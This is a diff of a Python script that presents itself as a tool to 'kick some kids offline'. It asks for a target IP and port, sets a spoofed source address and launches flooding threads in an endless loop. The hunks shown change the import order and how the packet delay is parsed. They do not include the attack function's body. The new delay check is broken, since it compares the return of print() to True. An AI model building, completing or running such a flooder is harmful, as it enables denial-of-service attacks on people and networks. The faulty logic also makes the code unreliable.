@@ -1,19 +1,23 @@
-import threading
 import socket
+import threading
 import time
 
 print("Welcome ( ° ͜ʖ°)╭∩╮. You here to kick some kids offline?")
-time.sleep(2)
+time.sleep(1.5)
 
 target = input("Enter a IP: ")
 time.sleep(0.75)
 str_port = input("Enter port: ")
 time.sleep(0.75)
 
-# Create Function here to read the number that is imputed to change WaitTime to either a integer or float
+WaitTime = input("Enter the delay between packets: ")
 
-WaitTime_string = input("Enter the delay between packets (This will only work if you put a decimal): ")
-WaitTime = float(WaitTime_string)
+x = WaitTime.isdecimal()
+
+if print(x) == True:
+    WaitTime = int(WaitTime)
+else:
+    WaitTime = float(WaitTime)
 
 port = int(str_port)
 fake_ip = '10.10.192.1'
@@ -32,5 +36,4 @@ while True:
     thread = threading.Thread(target=attack)
     thread.start()
     time.sleep(WaitTime)
-
     print(thread)
